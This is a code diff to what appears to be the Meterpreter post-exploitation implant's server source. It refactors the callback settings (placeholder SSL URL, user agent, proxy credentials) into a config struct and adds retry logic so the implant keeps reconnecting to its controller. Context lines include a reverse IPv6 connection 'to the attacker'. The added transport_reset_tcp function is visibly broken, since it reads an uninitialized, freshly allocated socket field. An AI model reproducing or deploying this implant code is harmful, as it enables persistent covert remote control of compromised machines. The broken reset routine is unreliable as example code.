@@ -5,22 +5,17 @@
 #include "../../common/common.h"
 #include <netdb.h>
 
-const DWORD RETRY_TIMEOUT_MS = 1000;
-
-char *global_meterpreter_transport =
-	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_url =
-	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
-char *global_meterpreter_ua =
-	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_proxy =
-	"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_proxy_username =
-	"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_proxy_password =
-	"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-int global_expiration_timeout = 0xb64be661;
-int global_comm_timeout = 0xaf79257f;
+MetsrvConfigData global_config =
+{
+	.transport = "METERPRETER_TRANSPORT_SSL\x00\x00",
+	.url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
+	.ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+	.proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+	.proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+	.proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
+	.timeouts.placeholder = "METERP_TIMEOUTS\x00"
+};
 
 #define SetHandleInformation(a, b, c)
 const unsigned int hAppInstance = 0x504b5320;	// 'PKS '
@@ -86,7 +81,6 @@ DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short r
 	{
 		return WSAGetLastError();
 	}
-
 
 	// prepare to connect to the attacker
 	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
@@ -197,16 +191,23 @@ static long unsigned int server_threadid_callback(void)
 	return pthread_self();
 }
 
-/*
- * Callback function for dynamic lock creation for OpenSSL.
+/*!
+ * @brief A callback function for dynamic lock creation for OpenSSL.
+ * @returns A pointer to a lock that can be used for synchronisation.
+ * @param file _Ignored_
+ * @param line _Ignored_
  */
 static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
 {
 	return (struct CRYPTO_dynlock_value *)lock_create();
 }
 
-/*
- * Callback function for dynamic lock locking for OpenSSL.
+/*!
+ * @brief A callback function for dynamic lock locking for OpenSSL.
+ * @param mode A bitmask which indicates the lock mode.
+ * @param l A point to the lock instance.
+ * @param file _Ignored_
+ * @param line _Ignored_
  */
 static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
 	int line)
@@ -219,16 +220,20 @@ static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, co
 	}
 }
 
-/*
- * Callback function for dynamic lock destruction for OpenSSL.
+/*!
+ * @brief A callback function for dynamic lock destruction for OpenSSL.
+ * @param l A point to the lock instance.
+ * @param file _Ignored_
+ * @param line _Ignored_
  */
 static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
 {
 	lock_destroy((LOCK *) l);
 }
 
-/*
- * Flush all pending data on the connected socket before doing SSL.
+/*!
+ * @brief Flush all pending data on the connected socket before doing SSL.
+ * @param remote Pointer to the remote instance.
  */
 static void server_socket_flush(Remote * remote)
 {
@@ -262,8 +267,11 @@ static void server_socket_flush(Remote * remote)
 	lock_release(remote->lock);
 }
 
-/*
- * Poll a socket for data to recv and block when none available.
+/*!
+ * @brief Poll a socket for data to recv and block when none available.
+ * @param remote Pointer to the remote instance.
+ * @param timeout Amount of time to wait before the poll times out (in milliseconds).
+ * @return Indication of success or failure.
  */
 static LONG server_socket_poll(Remote * remote, long timeout)
 {
@@ -279,16 +287,18 @@ static LONG server_socket_poll(Remote * remote, long timeout)
 	tv.tv_usec = timeout;
 	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 
-	if (result == -1 &&
-	    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
+	if (result == -1 && (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)) {
 		result = 0;
+	}
 
 	lock_release(remote->lock);
 	return result;
 }
 
-/*
- * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
+/*!
+ * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
+ * @param remote Pointer to the remote instance.
+ * @return Indication of success or failure.
  */
 static int server_initialize_ssl(Remote * remote)
 {
@@ -304,13 +314,14 @@ static int server_initialize_ssl(Remote * remote)
 	// Setup the required OpenSSL multi-threaded enviroment...
 	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
 	if (ssl_locks == NULL) {
-    dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
+	    dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
 		lock_release(remote->lock);
 		return -1;
 	}
 
-	for (i = 0; i < CRYPTO_num_locks(); i++)
+	for (i = 0; i < CRYPTO_num_locks(); i++) {
 		ssl_locks[i] = lock_create();
+	}
 
 	CRYPTO_set_id_callback(server_threadid_callback);
 	CRYPTO_set_locking_callback(server_locking_callback);
@@ -322,8 +333,10 @@ static int server_initialize_ssl(Remote * remote)
 	return 0;
 }
 
-/*
- * Bring down the OpenSSL subsystem
+/*!
+ * @brief Bring down the OpenSSL subsystem
+ * @param remote Pointer to the remote instance.
+ * @return Indication of success or failure.
  */
 BOOL server_destroy_ssl(Remote * remote)
 {
@@ -344,8 +357,9 @@ BOOL server_destroy_ssl(Remote * remote)
 		CRYPTO_set_dynlock_lock_callback(NULL);
 		CRYPTO_set_dynlock_destroy_callback(NULL);
 
-		for (i = 0; i < CRYPTO_num_locks(); i++)
+		for (i = 0; i < CRYPTO_num_locks(); i++) {
 			lock_destroy(ssl_locks[i]);
+		}
 
 		free(ssl_locks);
 		lock_release(remote->lock);
@@ -354,8 +368,10 @@ BOOL server_destroy_ssl(Remote * remote)
   return TRUE;
 }
 
-/*
- * Negotiate SSL on the socket.
+/*!
+ * @brief Negotiate SSL on the socket.
+ * @param remote Pointer to the remote instance.
+ * @return Indication of success or failure.
  */
 static BOOL server_negotiate_ssl(Remote * remote)
 {
@@ -402,8 +418,9 @@ static BOOL server_negotiate_ssl(Remote * remote)
 out:
 	lock_release(remote->lock);
 	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
-	if (ret < 0)
+	if (ret < 0) {
 		success = FALSE;
+	}
 	return success;
 }
 
@@ -527,16 +544,44 @@ BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 	return TRUE;
 }
 
+/*!
+ * @brief Destroy the TCP transport.
+ * @param transport Pointer to the TCP transport to reset.
+ */
 void transport_destroy_tcp(Remote* remote)
 {
-	if (remote && remote->transport)
+	if (remote && remote->transport && remote->transport->type == METERPRETER_TRANSPORT_SSL)
 	{
 		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
 		SAFE_FREE(remote->transport->url);
+		SAFE_FREE(remote->transport->ctx);
 		SAFE_FREE(remote->transport);
 	}
 }
 
+/*!
+ * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
+ * @param transport Pointer to the TCP transport to reset.
+ */
+static void transport_reset_tcp(Transport* transport)
+{
+	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	{
+		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
+		if (ctx->fd)
+		{
+			closesocket(ctx->fd);
+		}
+		ctx->fd = 0;
+	}
+}
+
+/*!
+ * @brief Creates a new TCP transport instance.
+ * @param url URL containing the transport details.
+ * @param timeouts The timeout values to use for this transport.
+ * @return Pointer to the newly configured/created TCP transport instance.
+ */
 Transport* transport_create_tcp(char* url)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
@@ -561,6 +606,12 @@ Transport* transport_create_tcp(char* url)
 	return transport;
 }
 
+/*!
+ * @brief Create a new transport based on the given metsrv configuration.
+ * @param config Pointer to the metsrv configuration block.
+ * @param stageless Indication of whether the configuration is stageless.
+ * @param fd The socket descriptor passed to metsrv during intialisation.
+ */
 Transport* transport_create(char* transport, char* url)
 {
 	Transport* t = NULL;
@@ -579,8 +630,10 @@ Transport* transport_create(char* transport, char* url)
 	return t;
 }
 
-/*
- * Setup and run the server. This is called from Init via the loader.
+/*!
+ * @brief Setup and run the server. This is called from Init via the loader.
+ * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
+ * @return Meterpreter exit code (ignored by the caller).
  */
 DWORD server_setup(SOCKET fd)
 {
@@ -633,7 +686,20 @@ DWORD server_setup(SOCKET fd)
 			remote->transport->transport_deinit(remote);
 		}
 
-		remote->transport->transport_destroy(remote);
+		// If the transport mechanism failed, then we should loop until we're able to connect back again.
+		// But if it was successful, and this is a valid exit, then we should clean up and leave.
+		if (dispatchResult == ERROR_SUCCESS) {
+			remote->transport->transport_destroy(remote);
+		}
+		else {
+			// try again!
+			if (remote->transport->transport_reset) {
+				remote->transport->transport_reset(remote->transport);
+			}
+
+			// when we have a list of transports, we'll iterate to the next one (perhaps?)
+			remote->next_transport = remote->transport;
+		}
 	}
 
 	dprintf("[SERVER] Deregistering dispatch routines...");
